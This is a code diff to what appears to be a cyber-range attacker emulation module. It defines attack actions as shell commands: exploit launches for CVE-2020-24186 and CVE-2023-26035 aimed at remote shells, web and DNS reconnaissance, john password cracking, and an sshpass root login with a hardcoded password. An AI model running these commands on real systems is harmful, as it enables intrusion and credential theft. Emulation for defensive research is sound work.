@@ -37,10 +37,7 @@ class EmulationAttackerShellActions:
         :return: the created action
         """
         id = EmulationAttackerActionId.INSTALL_TOOLS
-        cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
-               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip "
-               "-O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && "
-               "sudo mv SecLists-master /SecLists"]
+        cmd = ["sudo apt-get -y install dnsenum"]
         return EmulationAttackerAction(id=id, name="Install tools", cmds=cmd,
                                        type=EmulationAttackerActionType.POST_EXPLOIT,
                                        descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
@@ -229,3 +226,177 @@ class EmulationAttackerShellActions:
                                        ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                        alt_cmds=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                                        backdoor=True)
+
+    @staticmethod
+    def CVE_2020_24186_EXPLOIT(index: int) -> EmulationAttackerAction:
+        """
+        Launches the CVE-2020-24186 Wordpress wpDiscuz plugin
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
+        id = EmulationAttackerActionId.CVE_2020_24186_EXPLOIT
+        cmd = ["python3 /wpDiscuz_RemoteCodeExec.py -u http://15.16.3.32/ -p /2025/04/07/hello-world/"]
+        return EmulationAttackerAction(id=id, name="CVE-2020-24186 Wordpress wpDiscuz plugin exploit", cmds=cmd,
+                                       type=EmulationAttackerActionType.EXPLOIT,
+                                       descr="Uses the CVE-2020-24186 vulnerability to "
+                                             "obtain a remote shell.",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None, vulnerability=constants.CVE_2020_24186.VULNERABILITY_NAME,
+                                       backdoor=False)
+
+    @staticmethod
+    def CVE_2023_26035_EXPLOIT(index: int) -> EmulationAttackerAction:
+        """
+        Launches the CVE-26023-26035 ZoneMinder Exploit 
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
+        id = EmulationAttackerActionId.CVE_2023_26035_EXPLOIT
+        # TODO fix this command
+        cmd = ["python3 /zoneminder.py http://15.17.2.21/zm"]
+        return EmulationAttackerAction(id=id, name="CVE-26023-26035 ZoneMinder Snapshot Exploit", cmds=cmd,
+                                       type=EmulationAttackerActionType.EXPLOIT,
+                                       descr="Uses the CVE-26023-26035 vulnerability to "
+                                             "obtain a remote shell.",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
+                                       alt_cmds=None, vulnerability=constants.CVE_2023_26035.VULNERABILITY_NAME,
+                                       backdoor=False)
+
+    @staticmethod
+    def WPSCAN(index: int) -> EmulationAttackerAction:
+        """
+        Perform a WordPress Security Scan
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.WPSCAN
+        cmd = ["wpscan --url http://15.16.3.32"]
+        return EmulationAttackerAction(id=id, name="WPScan", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Perform a WordPress Security Scan",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+        
+    @staticmethod
+    def DIRB(index: int) -> EmulationAttackerAction:
+        """
+        Look for existing (and/or hidden) Web Objects
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.DIRB
+        cmd = ["dirb http://15.16.3.32 -r"]
+        return EmulationAttackerAction(id=id, name="dirb", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Look for existing (and/or hidden) Web Objects",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+        
+    @staticmethod
+    def FFUF(index: int) -> EmulationAttackerAction:
+        """
+        Look for existing (and/or hidden) Web Objects
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.FFUF
+        cmd = ["ffuf -w /SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://15.17.2.21/FUZZ"]
+        return EmulationAttackerAction(id=id, name="ffuf", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Look for existing (and/or hidden) Web Objects",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def OPENVPN_LOGIN(index: int) -> EmulationAttackerAction:
+        """
+        Login into a openVPN session
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.OPENVPN_LOGIN
+        cmd = ["sudo openvpn --config  /vpn-files/openvpn-config-sl001-daniel-cox.ovpn &"]
+        return EmulationAttackerAction(id=id, name="openvpn_login", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Login into a openVPN session",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def OPENVPN_EXIT(index: int) -> EmulationAttackerAction:
+        """
+        Exit a openVPN session
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.OPENVPN_EXIT
+        cmd = ["sudo killall openvpn"]
+        return EmulationAttackerAction(id=id, name="openvpn_exit", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Exit a openVPN session",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
+                                       backdoor=False)
+
+    @staticmethod
+    def ROOT_COMMANDS(index: int) -> EmulationAttackerAction:
+        """
+        Escalate Priv and commands
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.ROOT_COMMANDS
+        cmd = ["echo \"/script.sh\" | sshpass -p \"csle@admin-pw_191\" ssh csle_admin@15.16.3.32 -o StrictHostKeyChecking=no"]
+        return EmulationAttackerAction(id=id, name="root commands", cmds=cmd,
+                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
+                                       descr="Escalate Priv and commands",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT, alt_cmds=None,
+                                       backdoor=False)
+
+    def PASSWORD_CRACK(index: int) -> EmulationAttackerAction:
+        """
+        Hash cracking with john the ripper
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.PASSWORD_CRACK
+        # !! CHANGE THIS 
+        cmd = ["john --wordlist=rockyou.txt passwords.txt"]
+        return EmulationAttackerAction(id=id, name="hash cracking", cmds=cmd,
+                                       type=EmulationAttackerActionType.POST_EXPLOIT,
+                                       descr="Hash cracking with john the ripper",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
+        
+    def DNSENUM(index: int) -> EmulationAttackerAction:
+        """
+        Perform a DNS Enumeration
+
+        :param index: index of the machine to apply the action to
+        :return: the created action
+        """
+        id = EmulationAttackerActionId.DNSENUM
+        cmd = ["dnsenum -f /SecLists/Discovery/DNS/subdomains-top1million-5000.txt --dnsserver 15.17.1.13 aecid-testbed.com"]
+        return EmulationAttackerAction(id=id, name="dnsenum", cmds=cmd,
+                                       type=EmulationAttackerActionType.RECON,
+                                       descr="Perform a DNS Enumeration",
+                                       index=index,
+                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
+                                       backdoor=False)
